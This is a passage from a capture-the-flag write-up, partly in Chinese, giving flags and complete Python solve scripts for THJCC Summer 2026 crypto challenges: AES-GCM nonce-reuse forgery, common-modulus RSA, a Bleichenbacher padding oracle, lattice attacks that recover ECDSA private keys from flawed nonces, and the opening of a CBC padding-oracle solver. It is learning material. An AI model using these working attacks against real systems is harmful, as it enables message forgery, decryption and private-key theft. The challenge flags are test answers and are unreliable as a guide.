    flag = re.search(rb"THJCC\{[^}]+\}", reply)
    if flag:
        print(f"[+] FLAG: {flag.group().decode()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

</details>

**Forbidden（题名=攻击名）**
**Flag**：`THJCC{h_r3c0v3r3d_gcm_1s_f0rb1dd3n_w1th0ut_fr3sh_n0nc3s}`

AES-GCM nonce 复用：3 组同 nonce 的 (pt,ct,tag) → GHASH 多项式 GCD 恢复 H 与 tag
加密常数 E → 对目标明文伪造 (ct,tag)。GF(2^128) 必须用 NIST 右移版乘法；提交必须
复用 banner 同一连接。

<details>
<summary>📜 Forbidden solve.py（194 行，核心 recover_H@788 / forge@805）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - Forbidden (Crypto)
AES-GCM nonce reuse ("Forbidden" attack): the server encrypts several known
plaintexts with the SAME nonce/key. Recover the GHASH key H and the tag
encryption constant E = E(K, J0) from (pt, ct, tag) pairs, then forge a
valid (ct, tag) for the target plaintext "give me the flag".
Usage: solve.py [host] [port]
"""
import socket, sys

HOST = sys.argv[1] if len(sys.argv) > 1 else 'chal.thjcc.org'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 12002

# ---------------- GF(2^128), GCM convention (big-endian, poly x^128+x^7+x^2+x+1)
def gf_mul(a, b):
    # NIST SP 800-38D Algorithm 1 (right-shift "multiply")
    # 128-bit blocks as big-endian ints; bit 0 = MSB. R = x^127+x^126+x^125+x^120.
    z, v = 0, a
    R = 0xE1 << 120
    for i in range(128):
        if (b >> (127 - i)) & 1:
            z ^= v
        if v & 1:
            v = (v >> 1) ^ R
        else:
            v >>= 1
    return z

def gf_inv(a):
    # multiplicative identity under GCM mul is x^127 = 2^127 (leftmost bit),
    # so exponentiation must start from that, not from integer 1.
    r = 1 << 127
    e = (1 << 128) - 2
    while e:
        if e & 1:
            r = gf_mul(r, a)
        a = gf_mul(a, a)
        e >>= 1
    return r

# ---------------- polynomials over GF(2^128), coeff lists low->high
def poly_trim(a):
    while len(a) > 1 and a[-1] == 0:
        a = a[:-1]
    return a

def poly_xor(a, b):
    n = max(len(a), len(b))
    r = [0] * n
    for i in range(n):
        r[i] = (a[i] if i < len(a) else 0) ^ (b[i] if i < len(b) else 0)
    return poly_trim(r)

def poly_mod(a, b):
    a = poly_trim(a[:])
    b = poly_trim(b[:])
    db = len(b) - 1
    inv_lead = gf_inv(b[-1])
    r = a
    while len(r) - 1 >= db:
        shift = len(r) - 1 - db
        coef = gf_mul(r[-1], inv_lead)
        for i, bi in enumerate(b):
            r[i + shift] ^= gf_mul(coef, bi)
        r = poly_trim(r)
        if len(r) == 1 and r[0] == 0:
            break
    return r

def poly_gcd(a, b):
    a, b = poly_trim(a[:]), poly_trim(b[:])
    while not (len(b) == 1 and b[0] == 0):
        a, b = b, poly_mod(a, b)
    return a

# ---------------- GHASH (AAD empty)
def ghash(H, ct_bytes):
    L = len(ct_bytes) * 8
    padded = ct_bytes + b'\x00' * ((16 - len(ct_bytes) % 16) % 16)
    X = 0
    for i in range(0, len(padded), 16):
        X = gf_mul(X ^ int.from_bytes(padded[i:i + 16], 'big'), H)
    return gf_mul(X ^ L, H)  # len block: (0<<64) | L

# polynomial P(H) = GHASH(H, C) ^ tag   (P(H) == 0 for the real H)
def block_poly(pt, ct, tag):
    m = (len(ct) + 15) // 16
    padded = ct + b'\x00' * ((16 - len(ct) % 16) % 16)
    coeffs = [0] * (m + 2)
    # GHASH(H, C) = sum_j block_j * H^(m+1-j) + (len*8)*H   (block_0 first, highest power)
    for j in range(m):
        coeffs[m + 1 - j] = int.from_bytes(padded[j * 16:(j + 1) * 16], 'big')
    coeffs[1] ^= len(ct) * 8
    coeffs[0] ^= int.from_bytes(tag, 'big')
    return poly_trim(coeffs)

def recover_H(msgs):
    """msgs: list of (pt, ct, tag). Returns (H, E)."""
    p0 = block_poly(*msgs[0])
    g = None
    for m in msgs[1:]:
        p = poly_xor(p0, block_poly(*m))  # P(H) = 0
        g = p if g is None else poly_gcd(g, p)
    lead = g[-1]
    g = poly_trim([gf_mul(c, gf_inv(lead)) for c in g])
    if len(g) != 2:
        raise RuntimeError(f"GCD not linear, degree={len(g) - 1}")
    H = g[0]
    Es = {int.from_bytes(tag, 'big') ^ ghash(H, ct) for _pt, ct, tag in msgs}
    if len(Es) != 1:
        raise RuntimeError("E inconsistent across messages")
    return H, Es.pop()

def forge(msgs, target):
    H, E = recover_H(msgs)
    # derive keystream from a message long enough to cover the whole target
    pt0, ct0, _ = max(msgs, key=lambda m: len(m[0]))
    assert len(pt0) >= len(target), "no message long enough for target"
    ks1 = bytes(a ^ b for a, b in zip(pt0, ct0))
    ct_star = bytes(a ^ b for a, b in zip(target, ks1))
    tag_star = int.to_bytes(E ^ ghash(H, ct_star), 16, 'big')
    return H, E, ct_star, tag_star

# ---------------- network
def recv_all(s, timeout=2.0):
    s.settimeout(timeout)
    buf = b''
    try:
        while True:
            d = s.recv(4096)
            if not d:
                break
            buf += d
    except (socket.timeout, ConnectionResetError):
        pass
    return buf

def get_banner():
    s = socket.create_connection((HOST, PORT), timeout=10)
    banner = recv_all(s, 2.0)
    return s, banner

def parse(banner):
    nonce = None
    msgs = []
    target = None
    for line in banner.split(b'\n'):
        if not line:
            continue
        parts = line.split(b' ')
        if parts[0] == b'NONCE':
            nonce = bytes.fromhex(parts[1].decode())
        elif parts[0] == b'MSG':
            msgs.append((bytes.fromhex(parts[1].decode()),
                         bytes.fromhex(parts[2].decode()),
                         bytes.fromhex(parts[3].decode())))
        elif parts[0] == b'TARGET':
            target = bytes.fromhex(parts[1].decode())
    return nonce, msgs, target

def main():
    s, banner = get_banner()          # single connection: key/nonce are per-connection
    nonce, msgs, target = parse(banner)
    print(f"nonce={nonce.hex()} msgs={len(msgs)} target={target!r}", flush=True)
    assert target == b'give me the flag'
    assert len(msgs) >= 3

    H, E, ct_star, tag_star = forge(msgs, target)
    print(f"H  = {H:032x}", flush=True)
    print(f"E  = {E:032x}", flush=True)
    print(f"ct* = {ct_star.hex()}", flush=True)
    print(f"tag* = {tag_star.hex()}", flush=True)

    pt_hex, ct_hex, tag_hex = target.hex(), ct_star.hex(), tag_star.hex()
    candidates = [
        f'{ct_hex} {tag_hex}'.encode(),                      # confirmed working format
        f'MSG {pt_hex} {ct_hex} {tag_hex}'.encode(),
        f'{pt_hex} {ct_hex} {tag_hex}'.encode(),
        f'TARGET {ct_hex} {tag_hex}'.encode(),
    ]
    for payload in candidates:
        s.sendall(payload + b'\n')
        resp = recv_all(s, 2.0)
        print(f"sent {payload[:44]!r}... -> {resp!r}", flush=True)
        if b'NOPE' not in resp:
            print("=== SUCCESS ===", flush=True)
            print(resp.decode(errors='replace'), flush=True)
            s.close()
            return 0
    print("all formats returned NOPE")
    return 1

if __name__ == '__main__':
    sys.exit(main())
```

</details>

**Two Exponents**
**Flag**：`THJCC{n0t_c0pr1m3_but_st1ll_br0k3n_4nyw4y}`

共模 RSA 但 gcd(e1,e2)=3≠1：Bezout 得 m³ mod n，明文短 m³<n 直接开立方根。

<details>
<summary>📜 Two Exponents solve.py（49 行，核心 egcd@925）——点击展开</summary>

```python
#!/usr/bin/env python3
"""Two Exponents — common-modulus RSA with gcd(e1,e2)=3 variant.

Classic common-modulus needs gcd(e1,e2)==1; here gcd(111,39)=3, so the Bezout
combination yields c1^a * c2^b = m^3 mod n. Since the plaintext flag is short
(m^3 << n), the cube root is exact.
"""
import re
from math import gcd
from pathlib import Path

try:
    from sympy import integer_nthroot
except ImportError:
    import sys
    sys.exit("pip install sympy into the project venv")

data = Path(__file__).parent / "chal-Two-Exponents" / "output.txt"
text = data.read_text()
n = int(re.search(r"^n\s*=\s*(\d+)", text, re.M).group(1))
e1 = int(re.search(r"^e1\s*=\s*(\d+)", text, re.M).group(1))
c1 = int(re.search(r"^c1\s*=\s*(\d+)", text, re.M).group(1))
e2 = int(re.search(r"^e2\s*=\s*(\d+)", text, re.M).group(1))
c2 = int(re.search(r"^c2\s*=\s*(\d+)", text, re.M).group(1))

g = gcd(e1, e2)
print(f"gcd(e1,e2) = {g}")
assert g > 1, "classic gcd=1 path (a*e1+b*e2=1)"

# Bezout for a*e1 + b*e2 = g
def egcd(a, b):
    if b == 0:
        return a, 1, 0
    g_, x_, y_ = egcd(b, a % b)
    return g_, y_, x_ - (a // b) * y_

_, a, b = egcd(e1, e2)  # a*e1 + b*e2 = g
print(f"a={a} b={b}  (a*e1+b*e2={a*e1+b*e2})")

m_g = (pow(c1, a, n) * pow(c2, b, n)) % n  # == m^g mod n
print(f"m^g mod n bits: {m_g.bit_length()} / n bits: {n.bit_length()}")

root, exact = integer_nthroot(m_g, g)
print(f"g-th root exact: {exact}")
assert exact, "m^g >= n, need different strategy"

m = root
flag = bytes.fromhex(f"{m:x}").decode(errors="replace")
print("flag:", flag)
```

</details>

**A Million Messages**
**Flag**：`THJCC{bl31chenb4ch3r_st1ll_3ats_pkcs1_v1_5}`

每连接 fresh 512-bit RSA + 只验解密前缀 `00 02` 的行式 oracle = prefix-only
Bleichenbacher BB98；流水线批量查询 + 3 连接对冲，11.8k 次 20 分钟收敛。

<details>
<summary>📜 A Million Messages solve.py（216 行，核心 ask_batch@1004 批量化查询）——点击展开</summary>

```python
#!/usr/bin/env python3
"""THJCC Summer 2026 - "A Million Messages" - Bleichenbacher MMA solver.

Protocol (per connection, fresh 512-bit RSA key every connect):
  server -> "N <hex>", "E <hex>", "C <hex>"   (C = PKCS#1 v1.5-padded flag)
  client -> "<hex ciphertext X>"             (one line per query)
  server -> "OK" iff D(X) as k-byte big-endian starts with 00 02, else "BAD"

Oracle checks ONLY the first two bytes (verified: short padding / no 00
separator still return OK; type 01 / 03 return BAD), so the conforming set is
exactly [2B, 3B) with B = 2^(8(k-2)) -- textbook prefix-only Bleichenbacher.

Server processes ~24 queries/sec per connection, so we run several
independent attacks in parallel threads (each has its own connection/key)
and take whichever finishes first.

Usage: solve.py [host] [port] [n_conns]
"""
import socket, sys, threading, time, json

HOST = sys.argv[1] if len(sys.argv) > 1 else 'chal.thjcc.org'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 12003
NCONNS = int(sys.argv[3]) if len(sys.argv) > 3 else 3

def cdiv(x, y):
    return -((-x) // y)

class OracleConn:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=90)
        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.buf = b''
        self.n_sent = 0
        self.n_read = 0
        self.N = int(self.readline().split()[1], 16)
        self.E = int(self.readline().split()[1], 16)
        self.C = int(self.readline().split()[1], 16)

    def readline(self):
        while b'\n' not in self.buf:
            chunk = self.s.recv(65536)
            if not chunk:
                raise EOFError('server closed')
            self.buf += chunk
        line, self.buf = self.buf.split(b'\n', 1)
        return line

    def ask_batch(self, multipliers, chunk_hint=256):
        """Send oracle(C * t^e mod N) for each t; returns list of bools."""
        out = []
        for i in range(0, len(multipliers), chunk_hint):
            part = multipliers[i:i+chunk_hint]
            payload = b''.join((f"{(self.C * pow(t, self.E, self.N)) % self.N:x}".zfill(128) + '\n').encode() for t in part)
            self.s.sendall(payload)
            self.n_sent += len(part)
            for _ in part:
                out.append(self.readline() == b'OK')
                self.n_read += 1
        return out

def attack(idx, stop, results, log):
    def p(msg):
        log(f"[conn{idx}] {msg}")

    for attempt in range(4):
        if stop.is_set():
            return
        try:
            oc = OracleConn(HOST, PORT)
        except Exception as e:
            p(f"connect failed: {e!r}; retrying")
            time.sleep(2)
            continue
        N, E, C = oc.N, oc.E, oc.C
        k = (N.bit_length() + 7) // 8
        B = 1 << (8 * (k - 2))
        p(f"N={N:#x} (k={k}) queries={oc.n_sent}")

        t_start = time.time()
        try:
            # ---- phase 1: find s1 >= ceil(N/3B) with oracle true
            s = cdiv(N, 3 * B)
            CHUNK = 256
            s1 = None
            while s1 is None:
                if stop.is_set():
                    oc.s.close(); return
                mults = [s + i for i in range(CHUNK)]
                res = oc.ask_batch(mults)
                for t, ok in zip(mults, res):
                    if ok:
                        s1 = t
                        break
                s += CHUNK
                if (s - cdiv(N, 3 * B)) % 4096 < CHUNK:
                    rate = oc.n_read / max(time.time() - t_start, 1e-9)
                    p(f"phase1: scanned up to s={s}, {oc.n_read} q, {rate:.0f} q/s")
            p(f"phase1 HIT s1={s1} after {oc.n_read} queries ({time.time()-t_start:.0f}s)")

            # ---- phase 2
            M = [(2 * B, 3 * B - 1)]
            s_last = s1
            m_found = None
            while m_found is None:
                if stop.is_set():
                    oc.s.close(); return
                if len(M) == 1:
                    a, b = M[0]
                    if b - a <= 16:
                        for cand in range(a, b + 1):
                            if pow(cand, E, N) == C:
                                m_found = cand
                                break
                        else:
                            p("interval failed to verify -- restarting attack")
                            break
                        continue
                    r = cdiv(2 * (b * s_last - 2 * B), N)
                    got = False
                    while not got:
                        s_min = cdiv(2 * B + r * N, b)
                        s_max = (3 * B - 1 + r * N) // a
                        if s_min > s_max:
                            r += 1
                            continue
                        pos = s_min
                        while pos <= s_max and not got:
                            if stop.is_set():
                                oc.s.close(); return
                            mults = list(range(pos, min(s_max, pos + CHUNK - 1) + 1))
                            res = oc.ask_batch(mults)
                            for t, ok in zip(mults, res):
                                if ok:
                                    s_last = t; got = True; break
                            pos += CHUNK
                            if oc.n_read % 8192 < CHUNK:
                                p(f"2c scanning s~{pos} r={r} q={oc.n_read}")
                        if not got:
                            r += 1
                else:
                    got = False
                    scur = s_last + 1
                    while not got:
                        if stop.is_set():
                            oc.s.close(); return
                        mults = [scur + i for i in range(CHUNK)]
                        res = oc.ask_batch(mults)
                        for t, ok in zip(mults, res):
                            if ok:
                                s_last = t; got = True; break
                        scur += CHUNK
                        if oc.n_read % 8192 < CHUNK:
                            p(f"2b scanning s~{scur} q={oc.n_read}")
                # step 3: recompute intervals
                newM = []
                for (a, b) in M:
                    rlo = cdiv(a * s_last - 3 * B + 1, N)
                    rhi = (b * s_last - 2 * B) // N
                    for r in range(rlo, rhi + 1):
                        na = max(a, cdiv(2 * B + r * N, s_last))
                        nb = min(b, (3 * B - 1 + r * N) // s_last)
                        if na <= nb:
                            newM.append((na, nb))
                M = newM
                widths = sum(b2 - a2 + 1 for a2, b2 in M)
                p(f"phase2: s={s_last} intervals={len(M)} total_width_bits={widths.bit_length()} q={oc.n_read}")
                if len(M) == 1 and M[0][1] - M[0][0] <= 16:
                    a, b = M[0]
                    for cand in range(a, b + 1):
                        if pow(cand, E, N) == C:
                            m_found = cand
                            break
            if m_found is None:
                continue
            block = m_found.to_bytes(k, 'big')
            p(f"RECOVERED after {oc.n_read} queries: {block!r}")
            results.append((N, E, C, m_found, oc.n_read))
            stop.set()
            oc.s.close()
            return
        except Exception as e:
            p(f"error after {oc.n_read} queries: {e!r}; restarting")
            try:
                oc.s.close()
            except Exception:
                pass
            time.sleep(1)

def main():
    stop = threading.Event()
    results = []
    logs = []
    loglock = threading.Lock()
    def log(msg):
        with loglock:
            print(f"{time.strftime('%H:%M:%S')} {msg}", flush=True)

    threads = [threading.Thread(target=attack, args=(i, stop, results, log), daemon=True) for i in range(NCONNS)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    if results:
        N, E, C, m, nq = results[0]
        block = m.to_bytes((N.bit_length() + 7) // 8, 'big')
        sep = block.index(0, 2)
        flag = block[sep + 1:]
        print("FLAG:", flag.decode(errors='replace'), flush=True)
        with open('session_result.json', 'w') as f:
            json.dump({'N': hex(N), 'E': hex(E), 'C': hex(C), 'm': hex(m), 'queries': nq,
                       'flag': flag.decode(errors='replace')}, f, indent=1)
    else:
        print("no result", flush=True)

if __name__ == '__main__':
    main()
```

</details>

**Schizophrenic Signer**
**Flag**：`THJCC{w0w_y0u_f0und_th3_h1dd3n_d3lt4_b3tw33n_p_4nd_q!}`

LCG-nonce 双世界 HNP：p−q≈2¹²⁸ ⇒ k=state，商 t_i 消 d 归一化成
t_i≡A_i·t_0+B_i (mod q)；坐标加权(w=9) Kannan 嵌入 + BKZ-40。

发现过程：p−q≈2¹²⁸ 由 secp256k1 曲线常数直接算出——state mod q 的折叠以 1−2⁻¹²⁸ 概率不折叠，k=state 才成立；LCG 参数 a、b 明文给出，唯一隐藏量是更新时的商 t_i。真正的坎在格：朴素中心化嵌入的目标在 0.9·GH 附近，LLL/BKZ 怎么跑都不收敛（前一会话卡 8 小时的根因）；把 84 个陪集坐标统一乘 w=9（≈K·√12/a）、嵌入行取 K=2.65a，目标降到 ~0.55·GH，BKZ-40 秒出。a 每连接随机，log2(a)≤252.45 的"软实例"约占 36%——重连挑软的（实测第 4 次连接 15 秒解出）。

<details>
<summary>📜 Schizophrenic Signer solve.py（215 行，核心 lattice_solve@1283 / try_extract@1320）——点击展开</summary>

```python
#!/usr/bin/env python3
"""
Schizophrenic Signer (THJCC Summer 2026, crypto, challenge 27) — full solve.

Protocol (handout/server.py): server prints pubkey, LCG params a, b, then 85
ECDSA signatures (h, r, s) over fixed messages, generated with nonces
k_i = ((LCG state mod p) mod q); asks for private key d in hex -> flag.

Attack:
  * state_{i+1} = a*state_i + b - t_i*p with t_i = floor((a*state_i+b)/p) in [0, a)
    and k_i = state_i (p - q = D ~ 2^128 << q, so state % q = state w.h.p.)
  * ECDSA: k_i = alpha_i + beta_i*d (mod q), alpha_i = h_i/s_i, beta_i = r_i/s_i
  * => w_i + e_i*d = t_i*D (mod q) with e_i = beta_{i+1} - a*beta_i,
     w_i = a*alpha_i + b - alpha_{i+1}
  * eliminate d via equation 0:  t_i = A_i*t_0 + B_i (mod q), i = 1..83
  * weighted centered Kannan embedding, dim 85:
      rows w*(1, A_1..A_83 | 0), w*q*e_i, (w*C_1..w*C_83 | K)
    with C_i = B_i + A_i*half - half mod q, half = a//2, K = 2.65a, w = 9
    -> target vector (w*(t_i - half)... | K) sits at ~0.55*GH: uSVP, BKZ-30/40
  * candidate t_0 -> d = (w_0 - D*t_0)/e_0 mod q, verify d*G == pub
  * reconnect until log2(a) <= 0.45 + 252 (small a = easier lattice)

Usage:
  python3 solve.py --host chal.thjcc.org --port 11451
  python3 solve.py --local   (spawns handout/server.py)
"""
import argparse
import math
import os
import re
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
os.chdir(HERE)

from pwn import remote, process, context

from fpylll import IntegerMatrix, LLL, BKZ
from fpylll.algorithms.bkz2 import BKZReduction as BKZ2

# secp256k1
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
q = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
G_x = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
G_y = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
G = (G_x, G_y)

D = p - q
ACCEPT_LOG2A = 252.45   # reconnect if log2(a) above this (lattice gets too tight)


def add(P1, P2):
    if P1 is None: return P2
    if P2 is None: return P1
    x1, y1 = P1; x2, y2 = P2
    if x1 == x2 and y1 != y2: return None
    if x1 == x2:
        l = (3 * x1 * x1) * pow(2 * y1, -1, p) % p
    else:
        l = (y2 - y1) * pow(x2 - x1, -1, p) % p
    x3 = (l * l - x1 - x2) % p
    y3 = (l * (x1 - x3) - y1) % p
    return (x3, y3)


def mul(pt, n):
    res = None; curr = pt; n = n % q
    while n:
        if n & 1: res = add(res, curr)
        curr = add(curr, curr)
        n >>= 1
    return res


def connect(args):
    if args.local:
        return process(["python3",
                        os.path.join(HERE, "handout", "server.py")],
                       env={"FLAG": "THJCC{local_test_flag}", "PATH": os.environ["PATH"]})
    return remote(args.host, args.port)


def get_transcript(io):
    data = io.recvuntil(b"Private Key (d) in hex:", timeout=60).decode(errors="replace")
    m = re.search(r"Public Key: \(0x([0-9a-f]+), 0x([0-9a-f]+)\)", data)
    pub = (int(m.group(1), 16), int(m.group(2), 16))
    m = re.search(r"a = 0x([0-9a-f]+), b = 0x([0-9a-f]+)", data)
    a, b = int(m.group(1), 16), int(m.group(2), 16)
    sigs = []
    for mh, mr, ms in re.findall(r"h = 0x([0-9a-f]+)\nr = 0x([0-9a-f]+)\ns = 0x([0-9a-f]+)", data):
        sigs.append((int(mh, 16), int(mr, 16), int(ms, 16)))
    return pub, a, b, sigs


def lattice_solve(a, b, pub, sigs, deadline=None, verbose=True):
    """Weighted centered Kannan embedding + BKZ ladder. Returns d or None."""
    m = len(sigs) - 1
    alpha = [h * pow(s, -1, q) % q for h, r, s in sigs]
    beta = [r * pow(s, -1, q) % q for h, r, s in sigs]
    e = [(beta[i + 1] - a * beta[i]) % q for i in range(m)]
    wv = [(a * alpha[i] + b - alpha[i + 1]) % q for i in range(m)]
    inv_e0 = pow(e[0], -1, q)
    invD = pow(D, -1, q)
    A = [0] * m
    B = [0] * m
    for i in range(1, m):
        A[i] = e[i] * inv_e0 % q
        B[i] = (wv[i] - A[i] * wv[0]) % q * invD % q
    half = a // 2
    C = [(B[i] + A[i] * half - half) % q for i in range(1, m)]

    K = round(2.65 * a)
    ws = 9  # ~ K*sqrt(12)/a: equalizes expected per-coordinate contribution
    dim = m + 1
    M = IntegerMatrix(dim, dim)
    M[0, 0] = ws
    for i in range(1, m):
        M[0, i] = ws * A[i]
    for i in range(1, m):
        M[i, i] = ws * q
    for i in range(1, m):
        M[m, i] = ws * C[i - 1]
    M[m, m] = K

    cache = {}

    def pub_ok(dd):
        if dd not in cache:
            cache[dd] = 0 < dd < q and mul(G, dd) == pub
        return cache[dd]

    def try_extract():
        for row in range(dim):
            if abs(M[row, m]) != K or M[row, 0] % ws != 0:
                continue
            x = M[row, 0] // ws
            for t0 in (half + x, half - x):
                if 0 <= t0 < a:
                    dd = (wv[0] - D * t0) % q * inv_e0 % q
                    if pub_ok(dd):
                        return dd
        return None

    t0 = time.time()
    LLL.reduction(M)
    r = try_extract()
    if r:
        if verbose: print(f"[+] LLL: {time.time()-t0:.0f}s", flush=True)
        return r
    bkz = BKZ2(M)
    for blk in (30, 40, 50, 56):
        if deadline and time.time() > deadline:
            return None
        t1 = time.time()
        bkz(BKZ.Param(block_size=blk, max_loops=6,
                      flags=BKZ.AUTO_ABORT | BKZ.MAX_LOOPS | BKZ.GH_BND))
        if verbose:
            print(f"[*] BKZ2-{blk}: {time.time()-t1:.0f}s", flush=True)
        r = try_extract()
        if r:
            return r
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="chal.thjcc.org")
    ap.add_argument("--port", type=int, default=11451)
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--max-tries", type=int, default=30)
    ap.add_argument("--budget", type=int, default=300, help="lattice seconds per attempt")
    args = ap.parse_args()

    context.log_level = "warn"
    for attempt in range(1, args.max_tries + 1):
        print(f"[connect #{attempt}]", flush=True)
        io = connect(args)
        try:
            pub, a, b, sigs = get_transcript(io)
        except Exception as ex:
            print(f"[-] parse failed: {ex}", flush=True)
            io.close()
            continue
        if len(sigs) != 85:
            print(f"[-] expected 85 sigs, got {len(sigs)}", flush=True)
            io.close()
            continue
        la = math.log2(a)
        print(f"[*] a: log2 = {la:.3f}  ({'ACCEPT' if la <= ACCEPT_LOG2A else 'too big, reconnect'})",
              flush=True)
        if la > ACCEPT_LOG2A:
            io.close()
            time.sleep(1)
            continue
        t0 = time.time()
        d = lattice_solve(a, b, pub, sigs, deadline=time.time() + args.budget)
        if d is None:
            print("[-] lattice failed on this instance, reconnecting", flush=True)
            io.close()
            continue
        print(f"[+] d = {hex(d)}  ({time.time()-t0:.0f}s)", flush=True)
        io.sendline(hex(d).encode())
        resp = io.recvall(timeout=20).decode(errors="replace")
        print(resp, flush=True)
        m = re.search(r"THJCC\{[^}]*\}", resp)
        if m:
            print(f"[*] FLAG: {m.group(0)}", flush=True)
        return
    print("[-] exhausted attempts")


if __name__ == "__main__":
    main()
```

</details>

**Lattice of Doom**

**Flag**：`THJCC{l4tt1c3s_turn_b14s3d_n0nc3s_1nt0_pr1v4t3_k3ys}`

`|k_i| < 2²³²` 的 HNP：整数化满秩格（对角 N²、d 行系数 B、常数行 B·N），LLL 后最短向量给出私钥，AES-CBC 派生密钥解 flag。

发现过程：附件 `signer_excerpt.py` 里 `NONCE_BYTES = 29`——nonce 只有 232 位、比曲线阶 256 位少 24 位，即偏置 nonce；README 明示 "Many small things together are a lattice problem" 指向 HNP。格构造两个坑：B 与 B·N 必须分占两个独立列（放同一列矩阵秩亏缺、LLL 出零行）；还原时候选要试 `y//B ± N` 并用 `cand·G == Q` 验证唯一性。

<details>
<summary>📜 Lattice of Doom solve.py（125 行）——点击展开</summary>

```python

#!/usr/bin/env python3
"""Lattice of Doom (THJCC CTF Summer 2026, Crypto) — one-shot solve.

Attack: ECDSA (secp256k1) with biased nonces -> Hidden Number Problem -> LLL.
The firmware signs with 29-byte (232-bit) nonces; the curve order N is 256 bits.
From s_i = k_i^-1 (h_i + r_i*d) mod N we get k_i = a_i*d + b_i mod N with
|k_i| < 2^232, a classic HNP. Recover d with a lattice, then decrypt the flag
(AES-128-CBC, key = sha256(b"wallet-v1|" + d.to_bytes(32,'big'))[:16]).

Requires: fpylll, pycryptodome  (pip install fpylll pycryptodome)
Run from the challenge directory (expects handout/output.json).
"""
import hashlib
import json
from pathlib import Path

from Crypto.Cipher import AES
from fpylll import IntegerMatrix, LLL

# secp256k1 parameters
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8


def sha256_int(b: bytes) -> int:
    return int.from_bytes(hashlib.sha256(b).digest(), "big")


def point_mul(k: int):
    """Scalar multiplication on secp256k1 (double-and-add)."""
    def add(p, q):
        if p is None:
            return q
        if q is None:
            return p
        x1, y1 = p
        x2, y2 = q
        if x1 == x2 and (y1 + y2) % P == 0:
            return None
        if p == q:
            lam = (3 * x1 * x1) * pow(2 * y1, -1, P) % P
        else:
            lam = (y2 - y1) * pow(x2 - x1, -1, P) % P
        x3 = (lam * lam - x1 - x2) % P
        y3 = (lam * (x1 - x3) - y1) % P
        return (x3, y3)

    r = None
    base = (Gx, Gy)
    while k:
        if k & 1:
            r = add(r, base)
        base = add(base, base)
        k >>= 1
    return r


def main():
    for p in ("output.json", "handout/output.json", "handout/chal-Lattice-of-Doom/output.json"):
        if Path(p).exists():
            break
    data = json.loads(Path(p).read_text())
    Q = (int(data["Qx"], 16), int(data["Qy"], 16))
    n = len(data["signatures"])
    B = 1 << 232  # nonce bound: 29 bytes

    # k_i = a_i*d + b_i (mod N),  a_i = s_i^-1 r_i, b_i = s_i^-1 h_i
    a, b = [], []
    for sig in data["signatures"]:
        h = sha256_int(bytes.fromhex(sig["msg"]))
        r = int(sig["r"], 16)
        s = int(sig["s"], 16)
        si = pow(s, -1, N)
        a.append(si * r % N)
        b.append(si * h % N)

    # HNP lattice, full rank n+2 (integer version of the rational
    # construction with B/N coefficient on d, uniformly scaled by N):
    #   v_i = N^2 * e_i          (i = 0..n-1)
    #   v_a = (a_j*N ..., B, 0)
    #   v_b = (b_j*N ..., 0, B*N)
    # target vector = d*v_a + v_b - sum q_i*v_i = (N*k_j, B*d, B*N)
    m = n + 2
    M = IntegerMatrix(m, m)
    for i in range(n):
        M[i, i] = N * N
    for j in range(n):
        M[n, j] = a[j] * N
        M[n + 1, j] = b[j] * N
    M[n, n] = B
    M[n + 1, n + 1] = B * N
    LLL.reduction(M)

    # the reduced basis contains the target; its column n is B*d (+/- shifts)
    d = None
    for row in M:
        y = row[n]
        if y == 0:
            continue
        for cand in (y // B, -y // B, y // B - N, -y // B - N,
                     y // B + N, -y // B + N):
            if 0 < cand < N and point_mul(cand) == Q:
                d = cand
                break
        if d:
            break
    if d is None:
        raise SystemExit("[-] lattice attack failed")

    print(f"[+] private key d = {d:#x}")

    # decrypt flag: AES-128-CBC, key = sha256(b'wallet-v1|' + d32)[:16]
    key = hashlib.sha256(b"wallet-v1|" + d.to_bytes(32, "big")).digest()[:16]
    ct = bytes.fromhex(data["flag_enc"])
    pt = AES.new(key, AES.MODE_CBC, iv=b"\x00" * 16).decrypt(ct)
    flag = pt.split(b"THJCC{")[1]
    flag = b"THJCC{" + flag.split(b"}")[0] + b"}"
    print(f"[+] FLAG: {flag.decode()}")


if __name__ == "__main__":
    main()
```

</details>

**Oracle of Padding**

**Flag**：`THJCC{p4dd1ng_0r4cl3s_l34k_0n3_byt3_p3r_qu3ry}`

服务端只验提交密文最后一块 padding → 截断 `IV‖C1..Ck` 把 Ck 当最后一块逐字节解（修改 C_{k-1}，k=1 时即改 IV）。

发现过程（前一轮失败的两个根因，已修）：①索引错位——要改的块是被攻击块的前一块 `tok[16*(k-1)]`，写成 C_{k-2} 会全错；②oracle 语义——全 112B 提交时中间块改动恒 OK，必须截断提交让目标块成为最后一块。另：pos=0 的双命中（pad=1 真命中 + 意外长 padding 假命中）用 pos=1 全扫描消歧（假命中会让 pos=1 出现 256 个 OK）。

<details>
<summary>📜 Oracle of Padding solve.py（215 行，核心 decrypt_block@1626：截断提交 + pos=0 消歧）——点击展开</summary>

```python

#!/usr/bin/env python3
"""Oracle of Padding - corrected CBC padding oracle attack.

Root causes fixed vs the previous attempt:
  1. Index bug: to decrypt plaintext block P_k (k=1..6) we must modify the block
